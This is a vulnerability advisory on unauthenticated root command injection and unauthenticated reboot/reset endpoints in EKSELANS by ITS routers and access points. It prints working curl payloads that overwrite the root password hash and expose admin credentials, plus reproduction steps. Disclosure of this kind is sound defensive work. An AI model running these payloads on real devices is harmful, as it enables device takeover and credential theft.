
# 🔥 Unauthenticated RCE and Full Device Compromise on EKSELANS by ITS Devices

## Summary

Multiple network devices manufactured by **EKSELANS BY ITS** (https://www.ek.plus/) are affected by a set of critical vulnerabilities that allow **unauthenticated attackers** to:

- Gain **root remote code execution (RCE)**,
- **Extract sensitive information** including admin credentials,
- **Change system configuration**, including the root password,
- **Trigger device reboot** and **factory reset** via unauthenticated endpoints,
- Ultimately perform **full device takeover** and **persistent denial-of-service (DoS)**.

These issues stem from improper input validation and unsafe use of shell commands in PHP CGI scripts exposed via the web interface.

---

## Affected Devices

The following EKSELANS BY ITS devices were tested and found vulnerable:

- TR750  
- TR1200  
- TR1200OLP  
- TR1300  
- TR2200  
- TR3000W6  
- TR3000W6OLP  
- AP1200 W2  
- AP 300  
- AP300 LP  
- AP750 NG  

**⚠️ Note:** Other devices in the EKSELANS product line may also be vulnerable, but have not yet been tested.

---

## Vulnerability 1 – Remote Code Execution (RCE) as Root via `setNtp.php`

### Description

The script at:

```
http://<device-ip>/cgi-bin/setNtp.php
```

is intended to update the system's timezone setting via the `Zone` POST parameter. However, it directly injects this input into a shell command using `shell_exec()` **without sanitization**, allowing arbitrary command execution as **root**.

### Risk Level: **Critical**

This leads to:
- Full root-level remote code execution (RCE)
- Unauthorized modification of system files (e.g. `/etc/shadow`)
- Persistence (e.g. SSH backdoor)
- Exfiltration of configuration and credentials
- Bricking of the device

---

### Exploit Proofs-of-Concept (PoC)

#### 🔓 PoC 1 – Change root password to `toor` for future SSH access:

```bash
curl --location 'http://<device-ip>/cgi-bin/setNtp.php' \
--form 'Zone="UTC'''; sed -i '''s/^root:.*/root:$1$Awiloz1g$Je46CvkpbqUExnTav0W580:20193:0:99999:7:::/g''' /etc/shadow; echo '''"'
```

This injects a new password hash into `/etc/shadow` for the `root` user.

> 🛠️ *The hash corresponds to the password: `toor`*

---

#### 📁 PoC 2 – Exfiltrate web admin credentials:

```bash
curl --location 'http://<device-ip>/cgi-bin/setNtp.php' \
--form 'Zone="UTC'''; cp /etc/config/systemconf/config/account.conf /www/cgi-bin/pwned3.php; echo '''"'
```

You can now download the credentials at:

```
http://<device-ip>/cgi-bin/pwned3.php
```

---

### Vulnerable Code (Excerpt)

```php
$cmd = "sed -i '3ioption timezone " . $zone . "'" . " /etc/config/system";
shell_exec($cmd);
```

The `Zone` parameter is directly concatenated into a shell command, enabling arbitrary code execution.

---

## Vulnerability 2 – Unauthenticated Reboot via `devmanage_resetDefault.php`

### Description

A simple unauthenticated request to:

```
http://<device-ip>/cgi-bin/devmanage_resetDefault.php
```

**immediately reboots the device**, without requiring login or confirmation.

This could allow attackers to:
- Cause **persistent DoS**
- Disrupt connectivity or network availability
- Exploit race conditions with other vulnerabilities

---

## Vulnerability 3 – Unauthenticated Factory Reset

### Description

The same endpoint:

```
http://<device-ip>/cgi-bin/devmanage_resetDefault.php
```

in some firmware versions or configurations **triggers a full factory reset**, erasing custom settings, access credentials, and other user data.

This may result in:
- **Erasure of forensic evidence**
- **Loss of device access for legitimate users**
- Further **chaining of exploits** to set malicious defaults or gain persistence

---

## Step-by-Step Reproduction Guide

1. Identify a vulnerable EKSELANS device on the network.
2. Use `curl` or any HTTP client to POST to `/cgi-bin/setNtp.php` with a malicious `Zone` value.
3. Optionally extract files or drop a webshell using the same method.
4. For reboot/factory reset, issue a GET request to `/cgi-bin/devmanage_resetDefault.php`.

---

## Recommendations

- Immediately **remove public access** to affected devices.
- Apply **input sanitization** to all CGI scripts.
- Avoid using `shell_exec()` with user input.
- Restrict access to configuration endpoints via authentication.
- Apply firmware updates (if available) or contact vendor for mitigation guidance.

---

## Disclosure Timeline

- 15/04/2025  – Vendor notification in progress.

- 28/04/2025 – Public disclosure.

---

## Credits

Discovered and responsibly disclosed by **miitro**

---

## Disclaimer

This information is provided for educational and defensive security purposes. The author is not responsible for any misuse of this information.
